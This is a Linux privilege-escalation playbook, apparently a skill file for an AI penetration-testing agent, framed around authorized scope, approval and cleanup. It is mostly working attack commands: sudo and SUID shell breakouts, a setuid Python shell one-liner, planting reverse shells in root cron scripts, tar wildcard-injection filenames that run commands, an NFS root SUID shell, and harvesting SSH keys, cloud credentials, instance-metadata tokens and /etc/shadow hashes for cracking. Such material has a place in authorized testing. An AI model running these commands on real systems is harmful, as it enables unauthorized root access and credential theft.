---
name: privesc-linux
description: Deep-dive Linux local privilege escalation — SUID/GTFOBins, sudo, capabilities, cron/PATH/wildcard, writable systemd/services, NFS, kernel exploits, container escape, credential hunting.
---

# Linux Privilege Escalation (deep dive)

Foothold host in **declared scope only**. Prefer deterministic config/ACL misconfigs over kernel exploits (which can panic a box). Route loot to `$OUTPUT_DIR/loot/`.

---

## 1. Enumerate

```bash
id; sudo -l 2>/dev/null; uname -a; cat /etc/os-release
find / -perm -4000 -type f 2>/dev/null          # SUID
find / -perm -2000 -type f 2>/dev/null          # SGID
getcap -r / 2>/dev/null                          # capabilities
cat /etc/crontab; ls -la /etc/cron.*; systemctl list-timers
find / -writable -type d 2>/dev/null | grep -vE '^/(proc|sys)'
mount; cat /etc/fstab                            # nfs no_root_squash, nosuid?
# Automated (stage a static build; don't rely on internet on target)
./linpeas.sh -a | tee $OUTPUT_DIR/loot/linpeas.txt
```
Auto-scanners flag candidates — **confirm each by hand**.

---

## 2. sudo misconfiguration → GTFOBins

```bash
sudo -l   # read every NOPASSWD entry and every allowed binary
```
- Any allowed binary → check **GTFOBins** for its `sudo` breakout (e.g. `sudo vim -c ':!/bin/sh'`, `sudo less` → `!sh`, `sudo find . -exec /bin/sh \;`, `sudo awk 'BEGIN{system("/bin/sh")}'`).
- `env_keep+=LD_PRELOAD` / `LD_LIBRARY_PATH` → compile a malicious shared object and preload it via the allowed sudo command.
- Old sudo? `CVE-2021-3156` (Baron Samedit, heap overflow, pre-1.9.5p2) and `CVE-2019-14287` (`sudo -u#-1`) — check version with `sudo --version`.

## 3. SUID/SGID binaries

- Cross-ref every SUID binary against GTFOBins `suid` section. Classic wins: `pkexec` (**CVE-2021-4034 PwnKit**, near-universal), `cp`, `find`, `bash -p`, `nmap --interactive` (old), custom vendor binaries.
- Custom SUID binary calling a command without an absolute path → **PATH hijack** (§5).

## 4. Capabilities

```bash
getcap -r / 2>/dev/null
```
- `cap_setuid+ep` on an interpreter → `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'`.
- `cap_dac_read_search` → read arbitrary files (e.g. `/etc/shadow`). `cap_sys_admin` → often full escape.

## 5. Cron / PATH / wildcard injection

- World-writable script run by root cron → append a reverse shell / `chmod u+s /bin/bash`.
- Cron job invoking a bare command (no absolute path) + a writable dir earlier in root's `PATH` → drop a malicious binary of that name.
- **Wildcard injection**: root cron runs `tar cf backup.tar *` or `chown ... *` in a writable dir → plant filenames like `--checkpoint=1 --checkpoint-action=exec=sh script.sh` (tar) to get exec.

## 6. Writable services / systemd

```bash
find / -name '*.service' -writable 2>/dev/null
systemctl list-units --type=service
```
- Writable `.service` unit or the binary it launches → set `ExecStart=` to your payload, restart (or wait for boot).
- Writable `/etc/systemd/system/*.timer` similarly.

## 7. NFS no_root_squash

If `/etc/exports` (or a mount) shows `no_root_squash`, mount it from a box you control, create a root-owned SUID shell:
```bash
# on attacker (root):
mount -o rw $TARGET:/share /mnt && cp /bin/bash /mnt/rootbash && chmod +s /mnt/rootbash
# on target (low-priv):
/share/rootbash -p        # → euid 0
```

## 8. Kernel exploits (LAST resort — can panic the host)

- Match `uname -r` + distro to a known LPE: **DirtyPipe** (CVE-2022-0847, 5.8–5.16.11), **DirtyCow** (CVE-2016-5195), **nf_tables/netfilter** (CVE-2024-1086), OverlayFS variants.
- Verify the exact kernel/patch level; many "vulnerable" versions are backport-patched by the distro. **Get approval before running** — snapshot first, prefer a maintenance window.

## 9. Container escape signals (host-level triage)

`/.dockerenv` present, `cat /proc/1/cgroup` shows docker/kubepods, or `capsh --print` shows `cap_sys_admin`. Privileged container / mounted `docker.sock` / host mounts → escape. **Deep K8s/Docker escape is owned by `cloud-containers` (hunt-k8s)** — hand off there.

## 10. Credential & secret hunting (post-escalation and pre-)

```bash
grep -RiE 'password|passwd|secret|api[_-]?key|token' /etc /opt /var/www 2>/dev/null | head
cat ~/.bash_history /home/*/.bash_history 2>/dev/null
find / -name '*.env' -o -name 'id_rsa' -o -name '*.kdbx' 2>/dev/null
cat ~/.aws/credentials ~/.config/gcloud/*.json 2>/dev/null    # → cloud pivot (cloud-iam-deep)
# Cloud metadata from the host:
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null
```
As root: dump `/etc/shadow` for offline cracking (`hashcat -m 1800` for sha512crypt) — wordlist paths in `essential-tools/reference/wordlist-map.md`.

---

## Validation & cleanup

1. Confirm elevation from a clean shell (`id` → uid 0), not a lingering session.
2. Capture the exact vector + commands + output to `$OUTPUT_DIR/findings/finding-NNN/`.
3. Remove dropped binaries (linpeas, exploit, rootbash) and note them in the report.
4. State remediation (drop SUID bit, fix sudoers, absolute paths in cron, patch kernel, `root_squash`).
